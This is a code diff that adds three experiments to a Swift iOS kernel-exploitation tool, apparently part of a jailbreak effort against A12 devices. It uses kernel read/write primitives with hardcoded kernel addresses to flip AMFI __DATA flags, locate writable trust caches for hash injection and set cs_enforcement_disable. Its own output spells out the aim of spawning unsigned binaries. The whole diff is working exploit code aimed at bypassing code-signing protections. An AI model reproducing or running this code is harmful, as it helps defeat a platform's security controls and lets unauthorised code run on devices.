@@ -849,6 +849,36 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③o AMFI Data Write (Exp 93)",
+                    icon: "shield.slash",
+                    color: .red,
+                    label: "AMFI Data",
+                    action: runExp93AMFIDataWrite,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "③p Heap TC Scan (Exp 94)",
+                    icon: "magnifyingglass.circle",
+                    color: .orange,
+                    label: "Heap TC",
+                    action: runExp94HeapTCScan,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "③q CS Disable (Exp 95)",
+                    icon: "lock.open.fill",
+                    color: .red,
+                    label: "CS Disable",
+                    action: runExp95CSDisable,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "④ Test Binary Spawn",
                     icon: "terminal.fill",
                     color: .indigo,
@@ -6741,6 +6771,520 @@ struct AMFIExperimentView: View {
         return ExperimentResult(name: expName, success: writeOK, detail: detail, timestamp: Date())
     }
     #endif
+
+    // MARK: - Exp 93: AMFI __DATA Write Test
+
+    /// Exp 93: Test write to AMFI.kext __DATA (fileset component).
+    /// AMFI __DATA might be OUTSIDE KTRR range since it's a fileset aux component.
+    /// If writable: flip boolean flags → disable AMFI checks entirely.
+    private func runExp93AMFIDataWrite() {
+        isRunning = true
+        runningLabel = "AMFI Data"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expAMFIDataWrite()
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+        }
+    }
+
+    private func expAMFIDataWrite() -> ExperimentResult {
+        let expName = "AMFI Data Write (Exp 93)"
+        var detail = "Experiment 93: AMFI.kext __DATA Write Test\n"
+        detail += "============================================\n\n"
+
+        let kernBase = ds_get_kernel_base()
+        let slide = kernBase - 0xfffffff007004000  // unslid __TEXT base
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"
+
+        // AMFI __DATA from deep_tc_analysis.py
+        let amfiDataUnslid: UInt64 = 0xfffffff00a330098
+        let amfiDataSlid = amfiDataUnslid &+ slide
+        let amfiDataSize: UInt64 = 0x541
+
+        detail += "AMFI __DATA (unslid): 0x\(String(format: "%llx", amfiDataUnslid))\n"
+        detail += "AMFI __DATA (slid):   0x\(String(format: "%llx", amfiDataSlid))\n"
+        detail += "AMFI __DATA size:     0x\(String(format: "%llx", amfiDataSize))\n\n"
+
+        // Step 1: Read test — confirm we can read AMFI __DATA
+        detail += "=== Step 1: Read AMFI __DATA ===\n"
+
+        let readTest = ds_kread64_safe(amfiDataSlid)
+        detail += "AMFI __DATA[0]: 0x\(String(format: "%016llx", readTest))\n"
+
+        if readTest == 0 {
+            // Could be zero (valid) or could be unmapped
+            let readTest2 = ds_kread64_safe(amfiDataSlid + 8)
+            detail += "AMFI __DATA[8]: 0x\(String(format: "%016llx", readTest2))\n"
+            if readTest2 == 0 {
+                let readTest3 = ds_kread64_safe(amfiDataSlid + 0x110)
+                detail += "AMFI __DATA[0x110]: 0x\(String(format: "%016llx", readTest3))\n"
+                if readTest3 == 0 {
+                    detail += "⚠️ All reads return 0 — might be unmapped or wrong address\n\n"
+                }
+            }
+        }
+
+        // Dump first 0x200 bytes
+        detail += "\nAMFI __DATA dump (first 0x200 bytes):\n"
+        for off: UInt64 in stride(from: 0, to: 0x200, by: 8) {
+            let v = ds_kread64_safe(amfiDataSlid + off)
+            if v != 0 {
+                detail += "  +0x\(String(format: "%03x", off)): 0x\(String(format: "%016llx", v))\n"
+            }
+        }
+        detail += "\n"
+
+        // Step 2: Find boolean flags (values = 1)
+        detail += "=== Step 2: Find boolean flags ===\n"
+
+        // Known flag offsets from deep_tc_analysis.py (value=1 in kernelcache)
+        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
+        var foundFlags: [(offset: UInt64, value: UInt64)] = []
+
+        for off in flagOffsets {
+            guard off < amfiDataSize else { continue }
+            let v = ds_kread64_safe(amfiDataSlid + off)
+            detail += "  +0x\(String(format: "%03x", off)): 0x\(String(format: "%016llx", v))"
+            if v == 1 {
+                detail += " ← BOOL FLAG (1)\n"
+                foundFlags.append((off, v))
+            } else if v == 0 {
+                detail += " ← zero\n"
+            } else {
+                detail += "\n"
+            }
+        }
+        detail += "\nFound \(foundFlags.count) boolean flags set to 1\n\n"
+
+        // Step 3: WRITE TEST — try to flip ONE flag (safest: pick last one)
+        detail += "=== Step 3: Write test (single flag) ===\n"
+
+        guard !foundFlags.isEmpty else {
+            detail += "❌ No boolean flags found — AMFI __DATA might be at different address\n"
+            detail += "Or: AMFI __DATA is not readable (wrong slide?)\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Pick the LAST flag (least likely to be critical for stability)
+        let testFlag = foundFlags.last!
+        let testAddr = amfiDataSlid + testFlag.offset
+        detail += "Test target: AMFI __DATA+0x\(String(format: "%x", testFlag.offset))\n"
+        detail += "Address: 0x\(String(format: "%llx", testAddr))\n"
+        detail += "Current value: \(testFlag.value)\n"
+        detail += "Writing: 0 (disable flag)\n\n"
+
+        // Read before
+        let before = ds_kread64_safe(testAddr)
+        detail += "Before write: 0x\(String(format: "%016llx", before))\n"
+
+        // Write 0 (flip flag off)
+        ds_kwrite64(testAddr, 0)
+
+        // Read after
+        let after = ds_kread64_safe(testAddr)
+        detail += "After write:  0x\(String(format: "%016llx", after))\n\n"
+
+        let writeOK = (after == 0 && before == 1)
+
+        if writeOK {
+            detail += "✅✅✅ AMFI __DATA IS WRITABLE! ✅✅✅\n\n"
+            detail += "AMFI.kext __DATA is NOT protected by KTRR!\n"
+            detail += "We can patch ALL boolean flags to disable AMFI checks!\n\n"
+
+            // Restore the flag for now (don't break things yet)
+            ds_kwrite64(testAddr, 1)
+            let restored = ds_kread64_safe(testAddr)
+            detail += "Restored flag to 1: \(restored == 1 ? "OK" : "FAILED")\n\n"
+
+            detail += "=== NEXT STEPS ===\n"
+            detail += "1. Identify which flags control CDHash validation\n"
+            detail += "2. Flip the right flags → AMFI stops checking signatures\n"
+            detail += "3. posix_spawn unsigned binary → SUCCESS!\n\n"
+
+            detail += "=== ALL AMFI FLAGS (for batch disable) ===\n"
+            for off in flagOffsets {
+                detail += "  0x\(String(format: "%llx", amfiDataSlid + off)) (+0x\(String(format: "%x", off)))\n"
+            }
+        } else {
+            detail += "❌ Write FAILED — AMFI __DATA is also KTRR-protected.\n"
+            detail += "Fileset component __DATA is within KTRR range on A12.\n\n"
+            detail += "Value after write: 0x\(String(format: "%016llx", after))\n"
+            detail += "Expected: 0x0000000000000000\n"
+            detail += "This means KTRR covers ALL kernel segments including fileset.\n"
+        }
+
+        return ExperimentResult(name: expName, success: writeOK, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 94: Heap Trust Cache Scan
+
+    /// Exp 94: Scan __DATA zero slots on-device to find heap trust cache pointers.
+    /// Cryptex trust caches (System + App) are loaded at runtime into HEAP memory.
+    /// The head pointer lives in a __DATA slot that's 0 in kernelcache but non-zero at runtime.
+    private func runExp94HeapTCScan() {
+        isRunning = true
+        runningLabel = "Heap TC"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expHeapTCScan()
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+        }
+    }
+
+    private func expHeapTCScan() -> ExperimentResult {
+        let expName = "Heap TC Scan (Exp 94)"
+        var detail = "Experiment 94: Heap Trust Cache Scan\n"
+        detail += "=====================================\n\n"
+
+        let kernBase = ds_get_kernel_base()
+        let dataOff = PhysmapConstants.dataOffsetFromText
+        let dataSegBase = kernBase &+ dataOff
+
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "__DATA base: 0x\(String(format: "%llx", dataSegBase))\n\n"
+
+        // Trust cache v2 format (confirmed from IPSW):
+        //   +0x00: uint32 version (= 2)
+        //   +0x04: uuid[16]
+        //   +0x14: uint32 count
+        //   +0x18: entries[count] (24 bytes each)
+        detail += "Trust Cache v2 layout (confirmed from IPSW):\n"
+        detail += "  +0x00: version (uint32) = 2\n"
+        detail += "  +0x04: uuid (16 bytes)\n"
+        detail += "  +0x14: count (uint32)\n"
+        detail += "  +0x18: entries[] (24 bytes each)\n\n"
+
+        // Dynamic TC candidate slots from deep_tc_analysis.py
+        // These are zero in kernelcache = filled at runtime with heap pointers
+        let candidateSlots: [(offset: UInt64, label: String)] = [
+            (0x3980, "trust_cache region (14 refs)"),
+            (0x38e0, "trust_cache region (5 refs)"),
+            (0x3920, "trust_cache region (4 refs)"),
+            (0x3930, "trust_cache region (4 refs)"),
+            (0x38a0, "trust_cache region (3 refs)"),
+            (0x38c0, "trust_cache region (3 refs)"),
+            (0xe8, "early-init (214 refs)"),
+            (0x2770, "pmap_cs region (8 refs)"),
+            (0x2d0, "general (8 refs)"),
+            (0x1a4, "general (8 refs)"),
+            (0x248, "general (12 refs)"),
+            (0xf8, "early-init (9 refs)"),
+            (0x1f8, "general (6 refs)"),
+            (0x48, "early-init (5 refs)"),
+            (0xb4, "early-init (5 refs)"),
+            (0x45b8, "amfi_policy (4 refs)"),
+        ]
+
+        detail += "=== Scanning \(candidateSlots.count) __DATA slots ===\n\n"
+
+        var heapTCFound: [(slot: UInt64, ptr: UInt64, ver: UInt32, count: UInt32)] = []
+
+        for (off, label) in candidateSlots {
+            let slotAddr = dataSegBase &+ off
+            let ptr = ds_kreadptr(slotAddr)
+
+            if ptr == 0 {
+                detail += "  +0x\(String(format: "%04x", off)): NULL (\(label))\n"
+                continue
+            }
+
+            detail += "  +0x\(String(format: "%04x", off)): 0x\(String(format: "%llx", ptr)) (\(label))\n"
+
+            // Check if pointer is in heap range
+            let isHeap = isSafeKernelHeapKreadAddress(ptr)
+            let isKern = isSafeKernelKreadAddress(ptr)
+
+            if !isHeap && !isKern {
+                detail += "    → outside safe read range, skip\n"
+                continue
+            }
+
+            // Try to read as trust cache v2 struct
+            let ver: UInt32
+            let count: UInt32
+            if isHeap {
+                ver = safeKread32Heap(ptr)
+                count = safeKread32Heap(ptr &+ 0x14)
+            } else {
+                ver = safeKread32Kernel(ptr)
+                count = safeKread32Kernel(ptr &+ 0x14)
+            }
+
+            detail += "    ver=\(ver), count(+0x14)=\(count)"
+
+            if ver == 2 && count >= 1 && count <= 500_000 {
+                detail += " ← TRUST CACHE v2!\n"
+
+                // Read UUID
+                var uuidHex = ""
+                for i: UInt64 in stride(from: 4, to: 20, by: 4) {
+                    let chunk = isHeap ? safeKread32Heap(ptr &+ i) : safeKread32Kernel(ptr &+ i)
+                    uuidHex += String(format: "%08x", chunk)
+                }
+                detail += "    uuid: \(uuidHex)\n"
+
+                // Read first entry CDHash
+                let entryBase = ptr &+ 0x18
+                var cdhashHex = ""
+                for i: UInt64 in stride(from: 0, to: 20, by: 4) {
+                    let chunk = isHeap ? safeKread32Heap(entryBase &+ i) : safeKread32Kernel(entryBase &+ i)
+                    cdhashHex += String(format: "%08x", chunk)
+                }
+                let hashType = isHeap ? safeKread32Heap(entryBase &+ 20) & 0xFF : safeKread32Kernel(entryBase &+ 20) & 0xFF
+                detail += "    entry[0]: \(cdhashHex) ht=\(hashType)\n"
+
+                heapTCFound.append((off, ptr, ver, count))
+
+                // Check if this is in HEAP (writable!)
+                if isHeap {
+                    detail += "    📍 LOCATION: HEAP (WRITABLE!)\n"
+                } else {
+                    detail += "    📍 LOCATION: kernel __DATA/TEXT (KTRR protected)\n"
+                }
+            } else if ver == 1 && count >= 1 && count <= 500_000 {
+                // v1 format: version(4) + count(4) + entries
+                let countV1 = isHeap ? safeKread32Heap(ptr &+ 4) : safeKread32Kernel(ptr &+ 4)
+                detail += " (v1? count@+4=\(countV1))\n"
+                if countV1 >= 1 && countV1 <= 500_000 {
+                    heapTCFound.append((off, ptr, 1, countV1))
+                    if isHeap {
+                        detail += "    📍 LOCATION: HEAP (WRITABLE!)\n"
+                    }
+                }
+            } else {
+                // Not a trust cache — might be linked list node
+                detail += "\n"
+
+                // Try following as linked list: ptr → next at +0x00 or +0x08
+                let next0 = isHeap ? safeKread64Heap(ptr) : safeKread64Kernel(ptr)
+                let next8 = isHeap ? safeKread64Heap(ptr &+ 8) : safeKread64Kernel(ptr &+ 8)
+
+                // Check if it's a wrapper struct: {next, tc_ptr}
+                for (nextOff, nextVal) in [(UInt64(0), next0), (UInt64(8), next8)] {
+                    let nextPtr = nextVal & 0x0000FFFFFFFFFFFF  // strip PAC
+                    guard nextPtr > 0xffffffdc00000000, nextPtr < 0xffffffe500000000 else { continue }
+                    guard isSafeKernelHeapKreadAddress(nextPtr) else { continue }
+
+                    let innerVer = safeKread32Heap(nextPtr)
+                    let innerCount = safeKread32Heap(nextPtr &+ 0x14)
+                    if innerVer == 2 && innerCount >= 1 && innerCount <= 500_000 {
+                        detail += "    → follow +0x\(String(format: "%x", nextOff)): 0x\(String(format: "%llx", nextPtr))\n"
+                        detail += "      ver=\(innerVer), count=\(innerCount) ← TRUST CACHE v2 (HEAP)!\n"
+                        heapTCFound.append((off, nextPtr, innerVer, innerCount))
+                    }
+                }
+            }
+        }
+
+        detail += "\n"
+
+        // Summary
+        detail += "=== SUMMARY ===\n\n"
+
+        if heapTCFound.isEmpty {
+            detail += "❌ No heap trust cache found in scanned slots.\n\n"
+            detail += "Possible reasons:\n"
+            detail += "  1. Cryptex TC loaded at different __DATA offset\n"
+            detail += "  2. TC pointer is behind linked list wrapper\n"
+            detail += "  3. Need to scan more slots or follow pointer chains\n"
+        } else {
+            detail += "✅ Found \(heapTCFound.count) trust cache(s):\n\n"
+            for (i, tc) in heapTCFound.enumerated() {
+                let isHeap = isSafeKernelHeapKreadAddress(tc.ptr)
+                detail += "  [\(i)] __DATA+0x\(String(format: "%x", tc.slot))\n"
+                detail += "      ptr: 0x\(String(format: "%llx", tc.ptr))\n"
+                detail += "      ver: \(tc.ver), count: \(tc.count)\n"
+                detail += "      writable: \(isHeap ? "YES (HEAP)" : "NO (KTRR)")\n\n"
+            }
+
+            // If any are in heap, we can inject!
+            let writableTCs = heapTCFound.filter { isSafeKernelHeapKreadAddress($0.ptr) }
+            if !writableTCs.isEmpty {
+                detail += "🎉🎉🎉 WRITABLE TRUST CACHE FOUND! 🎉🎉🎉\n\n"
+                detail += "Next: Exp 92 with CORRECT offsets:\n"
+                detail += "  TC addr: 0x\(String(format: "%llx", writableTCs[0].ptr))\n"
+                detail += "  Count offset: +0x14 (not +0x04!)\n"
+                detail += "  Entries offset: +0x18 (not +0x08!)\n"
+                detail += "  Entry stride: 24 bytes\n"
+
+                // Save for use by other experiments
+                DispatchQueue.main.async {
+                    self.probedTCAddr = writableTCs[0].ptr
+                    self.probedTCCount = writableTCs[0].count
+                    self.probedTCStride = 24
+                }
+            }
+        }
+
+        return ExperimentResult(name: expName, success: !heapTCFound.isEmpty, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 95: cs_enforcement_disable
+
+    /// Exp 95: Find and set cs_enforcement_disable flag.
+    /// The function at 0xfffffff008f852dc references "cs_enforcement_disable" string.
+    /// Trace its __DATA accesses to find the actual flag variable.
+    private func runExp95CSDisable() {
+        isRunning = true
+        runningLabel = "CS Disable"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expCSDisable()
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+        }
+    }
+
+    private func expCSDisable() -> ExperimentResult {
+        let expName = "CS Disable (Exp 95)"
+        var detail = "Experiment 95: cs_enforcement_disable\n"
+        detail += "=======================================\n\n"
+
+        let kernBase = ds_get_kernel_base()
+        let slide = kernBase - 0xfffffff007004000
+        let dataSegBase = kernBase &+ PhysmapConstants.dataOffsetFromText
+
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n"
+        detail += "__DATA base: 0x\(String(format: "%llx", dataSegBase))\n\n"
+
+        // cs_enforcement_disable string found at 0xfffffff00749cd5d (unslid)
+        // Referenced by function at 0xfffffff008f852dc (unslid)
+        // That function likely reads/writes a __DATA global for the flag
+
+        // Strategy: scan known __DATA slots that might be cs_enforcement_disable
+        // The flag is likely a single byte or uint32 in __DATA
+        // From deep_tc_analysis: slot +0x45b8 is "amfi_policy region" (4 refs)
+        // This is the most likely candidate for cs_enforcement_disable
+
+        detail += "=== Strategy ===\n"
+        detail += "cs_enforcement_disable string at 0x\(String(format: "%llx", 0xfffffff00749cd5d &+ slide))\n"
+        detail += "Referenced by func at 0x\(String(format: "%llx", 0xfffffff008f852dc &+ slide))\n\n"
+
+        // Scan AMFI-related __DATA slots
+        let csSlotCandidates: [(UInt64, String)] = [
+            (0x45b8, "amfi_policy region (4 refs)"),
+            (0x45c0, "amfi_policy +8"),
+            (0x45c8, "amfi_policy +16"),
+            (0x45d0, "amfi_policy +24"),
+            (0x45d8, "amfi_policy +32"),
+            (0x45e0, "amfi_policy +40"),
+            (0x45e8, "amfi_policy +48"),
+            (0x45f0, "amfi_policy +56"),
+            (0x4600, "amfi_policy +72"),
+            (0x4608, "amfi_policy +80"),
+        ]
+
+        detail += "=== Scanning __DATA amfi_policy region ===\n\n"
+
+        var foundDisableFlag: (addr: UInt64, offset: UInt64, value: UInt64)?
+
+        for (off, label) in csSlotCandidates {
+            let addr = dataSegBase &+ off
+            let val = ds_kread64_safe(addr)
+            detail += "  +0x\(String(format: "%04x", off)): 0x\(String(format: "%016llx", val)) (\(label))\n"
+
+            // cs_enforcement_disable is likely 0 (disabled by default on production)
+            // or 1 (if somehow enabled). We want to SET it to 1.
+            if val == 0 || val == 1 {
+                if foundDisableFlag == nil {
+                    foundDisableFlag = (addr, off, val)
+                }
+            }
+        }
+
+        detail += "\n"
+
+        // Also check the AMFI __DATA boolean flags
+        detail += "=== AMFI __DATA flags (fileset component) ===\n"
+        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
+
+        // These flags are already 1 — try setting to 0 to disable AMFI
+        let amfiFlagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
+
+        for off in amfiFlagOffsets {
+            let addr = amfiDataSlid &+ off
+            let val = ds_kread64_safe(addr)
+            detail += "  AMFI+0x\(String(format: "%03x", off)): \(val)\n"
+        }
+        detail += "\n"
+
+        // Try write to amfi_policy region (+0x45b8)
+        detail += "=== Write test: __DATA+0x45b8 ===\n"
+        let testAddr = dataSegBase &+ 0x45b8
+        let beforeVal = ds_kread64_safe(testAddr)
+        detail += "Before: 0x\(String(format: "%016llx", beforeVal))\n"
+
+        // Write 1 (enable cs_enforcement_disable = disable enforcement)
+        ds_kwrite32(testAddr, 1)
+        let afterVal = ds_kread32_safe(testAddr)
+        detail += "After write 1: 0x\(String(format: "%08x", afterVal))\n\n"
+
+        let mainDataWriteOK = (afterVal == 1 && beforeVal != 1)
+
+        if mainDataWriteOK {
+            detail += "✅ Main kernel __DATA+0x45b8 IS WRITABLE!\n\n"
+            detail += "This is unexpected — main __DATA should be KTRR protected.\n"
+            detail += "But if it works, cs_enforcement_disable might be active!\n\n"
+
+            // Restore
+            ds_kwrite32(testAddr, UInt32(beforeVal & 0xFFFFFFFF))
+
+            detail += "Test: spawn unsigned binary to confirm CS is disabled.\n"
+        } else {
+            detail += "❌ Main __DATA write failed (KTRR as expected).\n\n"
+
+            // Try AMFI __DATA instead
+            detail += "=== Trying AMFI __DATA flags ===\n"
+            let amfiTestAddr = amfiDataSlid &+ 0x110
+            let amfiBefore = ds_kread64_safe(amfiTestAddr)
+            detail += "AMFI+0x110 before: 0x\(String(format: "%016llx", amfiBefore))\n"
+
+            // Try write 0 (disable this flag)
+            ds_kwrite64(amfiTestAddr, 0)
+            let amfiAfter = ds_kread64_safe(amfiTestAddr)
+            detail += "AMFI+0x110 after write 0: 0x\(String(format: "%016llx", amfiAfter))\n\n"
+
+            let amfiWriteOK = (amfiAfter == 0 && amfiBefore != 0)
+            if amfiWriteOK {
+                detail += "✅ AMFI __DATA IS WRITABLE!\n\n"
+                // Restore
+                ds_kwrite64(amfiTestAddr, amfiBefore)
+                detail += "Restored. Next: disable ALL AMFI flags and test spawn.\n"
+            } else {
+                detail += "❌ AMFI __DATA also KTRR-protected.\n"
+                detail += "All fileset __DATA is within KTRR range on A12.\n"
+            }
+
+            return ExperimentResult(name: expName, success: amfiWriteOK, detail: detail, timestamp: Date())
+        }
+
+        return ExperimentResult(name: expName, success: mainDataWriteOK, detail: detail, timestamp: Date())
+    }
 
     // MARK: - Patch amfid (safe — no kill, no respring)
 
